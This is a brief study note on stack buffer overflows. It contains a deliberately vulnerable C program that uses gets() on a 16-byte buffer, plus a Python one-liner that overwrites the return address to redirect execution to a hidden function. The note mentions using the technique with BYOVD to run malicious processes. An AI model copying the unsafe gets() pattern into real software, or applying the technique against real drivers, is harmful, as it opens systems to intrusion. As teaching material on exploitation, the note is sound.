- Old
- Nice for BYOVD if you wanna try and hook into some innocent driver to run your own malicious process
- Basically, you overflow a buffer and saved frame pointer to overwrite the return address to your own malicious program
- Ex:
```C
#include <stdio.h>
#include <string.h>

void secret_vault() {
    printf("ACCESS GRANTED: Here is your Kernel Flag!\n");
}

void get_user_input() {
    char buffer[16]; // pretty small buffer here
    printf("Enter your name: ");
    
	
	// note that gets was removed in like C11 or something. this is just for demonstration
	// gets doesn't check the size of what it's inputting, nor the buffer.
	// this means we can throw something in of whatever size we want, even if it's greater than 16 bytes
    gets(buffer); 
}

int main() {
    get_user_input();
    printf("Exiting normally...\n");
    return 0;
}
```

```bash
# python to print the junk + the memory address 
python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x96\x11\x40\x00\x00\x00\x00\x00')" | ./vuln
# 16 bytes to fill the buffer, 8 to fill the SFP, last 8 for the secret vault's memory address
```